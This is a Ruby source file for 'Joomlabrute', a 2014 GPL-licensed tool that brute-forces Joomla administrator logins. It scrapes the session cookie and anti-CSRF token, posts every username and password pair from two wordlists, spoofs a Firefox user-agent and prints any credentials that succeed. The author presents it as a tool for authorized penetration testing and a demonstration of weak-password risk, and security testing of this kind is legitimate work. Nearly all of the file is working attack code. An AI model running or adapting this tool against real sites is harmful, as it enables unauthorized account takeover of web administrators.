#!/usr/bin/env ruby
# encoding: UTF-8

=begin

## SYNPOSYS ##

    Joomlabrute is a simple credential brute forcer against the popular Joomla Web CMS.
    Thanks to the power of the Ruby language, it was easy to do and, as well, can be easily modified to support other platforms.
    
    It is intended for authorized Web Application Pen Testing only.
    It aims to show how easy it is to drive a bruteforce attack and to stress out (again) the need of using strong passwords and, even better, not exposing administration interfaces publicly.
    Use either source IP address filtering, IPSEC VPN, SSL client verification, 2-factor authentication, etc.).
    
    Copyright (C) 2014  Jean-Christophe Baptiste
    (jc@phocean.net, http://www.phocean.net)

## LICENSE ##    
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>

## NOTES ##

	* Should work with any Ruby framework on any platform (./joomlabruter.rb)
	* Tested successfuly against Joomla version 3 (latest at this time)
		This script would be updated if I happened to work against other versions. .
		Your feedback is warmly welcomed.

## TO DO ##

	* clean and improve the code when I am more than a Ruby noob (my fisrt try with this language)
	
=end

require 'uri'
require 'net/http'
require 'optparse'
require 'ostruct'

$VERBOSE = nil


=begin
	Class for app related settings (name, version, help, options).
=end
class App
	
	def initialize()
		@name = $PROGRAM_NAME
		@Version = '0.1'
	end
	
	# option parsing based on ruby/optparse
	def parse(args)
		# default args
		options = OpenStruct.new
		
		opt_parser = OptionParser.new do |opts|
			
			opts.banner = "Usage #{@name} <URL> [options]"
			opts.separator ""
			
			# Mandatory settings
			opts.separator "Mandatory settings:"
			opts.on("-w", "--wordlist </path/to/file>", "Wordlist file (mandatory)") do |file|
				options.wordlist = file
			end
			opts.on("-u", "--userlist </path/to/file>", "User list file (mandatory)") do |file|
				options.users = file
			end
			
			# Program options
			opts.separator ""
			opts.separator "Specific options:"
			opts.on("-P", "--proxy http(s)://<host>:<port>", "HTTP proxy to use for requests (Burp Suite?)") do |proxy|
				uri = URI.parse(proxy)
				options.proxy_addr = uri.host
				options.proxy_port = uri.port
			end
			opts.on("-v", "--[no-]verbose", "Run verbosely") do |v|
				v = true ? $VERBOSE = true : $VERBOSE
			end
			
			# Common options
			opts.separator ""
			opts.separator "Common options:"
			opts.on_tail("-h", "--help", "Show usage") do
				puts opts
				exit
			end
			opts.on_tail("--version", "Show version") do
				puts Version
				exit
			end
		end
		
		opt_parser.parse!(args)
		# Check for mandatory options
                if not options.wordlist and not options.users
                        puts opt_parser
                        exit
                end
		if not options.wordlist
			puts "[!] Missing Wordlist setting, see help (-h)"
			exit
		end
		if  not options.users
			puts "[!] Missing User list setting, see help (-h)"
			exit
		end
		# return
		options
	end
end

=begin
	Class for generic HTTP settings, preparing the HTTP request.
	Could be reused for various versions of Joomla or other CMS.
=end
class HttpConnect
	# get the basic stuff (target, proxy) and create an HTTP object
	def initialize( url, proxy_addr=nil, proxy_port=nil)
		@proxy_addr = proxy_addr
		@proxy_port = proxy_port
		@url = url
		@uri = URI.parse(url)
		@http = Net::HTTP.new(@uri.host,@uri.port,@proxy_addr,@proxy_port)
	end
	
	# Set user-agent and connection headers
	def set_headers(req)
		req['Connection'] = "keep-alive"
		req['User-Agent'] = "Mozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0"
		req
	end	
	
	# wrapper setting headers for GET requests
	def get_wrapper()
		req = Net::HTTP::Get.new(@uri.request_uri)
		self.set_headers(req)
	end
end

=begin
	Inherited class from HttpConnect, adding stuff specific to Joomla (form POST variables, cookie, faked referer...).
	It aims to prepare the HTTP connection for the JmlBrute class that actually sends requests.
=end
class JmlAuth < HttpConnect
	def initialize(url='http://127.0.0.1', proxy_addr=nil, proxy_port=nil)
		super(url, proxy_addr, proxy_port)
	end
	
	def get1()
		@http.request(self.get_wrapper)
	end
	
	def post(cookie,token,user,pass)
		req = Net::HTTP::Post.new(@uri.request_uri)
		req = self.set_headers(req)
		req.set_form_data({
			'username'	=> user,
			'passwd'	=> pass,
			'option'	=> 'com_login',
			'task'		=> 'login',
			'return'	=> 'aW5kZXgucGhw',
			token		=> 1,
		})
		req['Cookie'] = cookie
		req['Referer'] = @url
		@http.request(req)
	end
	
	def get2(cookie,url)
		req = self.get_wrapper
		req['Cookie'] = cookie
		req['Referer'] = url
		@http.request(req)
	end
end

=begin
	Inherited class from HttpConnect taking care of the authentication sequence
		1. GET the authentication page, retrieve the cookie and the anti-CSRF token
		2. POST the authentication form, with user, password, cookie, CSRF token, etc.
		3. Follow the redirection answered by Joomla. Apply a regex on this page to determine whether the connection was successful or not.
=end
class JmlBrute < JmlAuth
	def intialize(url='http://127.0.0.1', proxy_addr=nil, proxy_port=nil)
		super(url, proxy_addr, proxy_port)
	end
	
	def sequence(user,pass)
		cookie,token = get_tokens()
		warn "[-] Got cookie: #{cookie}"
		warn "[-] Got CSRF token: #{token}"
		resp = send_post(cookie,token,user,pass)
		case resp
			when Net::HTTPSuccess then
				puts "[!] Server responded but no redirection"
			when Net::HTTPRedirection then
				location = resp['location']
				warn "[-] Redirected to #{location}"
				resp = follow_redirect(cookie,location,@url)
				# look for the presence of the "password" input field
				if resp.body =~ /<input name="passwd"/
					warn "[-] FAIL"
				else
					puts "[+] SUCCESS: #{user}:#{pass}"
				end
			else
				puts "[!] Connection failed"
				resp.value
			end
	end	
	
	def get_tokens()
		resp = self.get1
		cookie = resp['Set-Cookie']
		# CSRF token
		resp.body =~ /<input type="hidden" name="([a-z0-9]{32})" value="1" \/>/
		token = $1
		return cookie,token
	end
	
	def send_post(cookie,token,user,pass)
		self.post(cookie,token,user,pass)
	end
	
	def follow_redirect(cookie,location,url)
		self.get2(cookie,url)
	end
end

# Main
if __FILE__ == $0
	
	begin
	
		# Parse args and options
		app = App.new()
		options = app.parse(ARGV)
		begin
			target = ARGV.pop
			raise "Need to specify a file to process" unless target
		rescue
			puts "[!] Missing Target"
			exit
		end

		# Joomla connection object
		jml = JmlBrute.new(target,options.proxy_addr,options.proxy_port)
		
		# load user file in memory
		users = File.open(options.users).readlines
		
		# loop within the wordlist
		wordlist = File.open(options.wordlist)
		wordlist.each {|pass|
		        # for each password, fire a Joomla authentication sequence with each user name
			users.each {|user|
					jml.sequence(user.gsub("\n", ""),pass.gsub("\n", ""))
					}
			}
		wordlist.close
	
	# catch CTRL-C and other exceptions
	rescue Interrupt
		puts "\n[!] Exit to system"
		exit 2
	rescue Exception => e
		puts e
		exit 3
	end
	exit 0
end
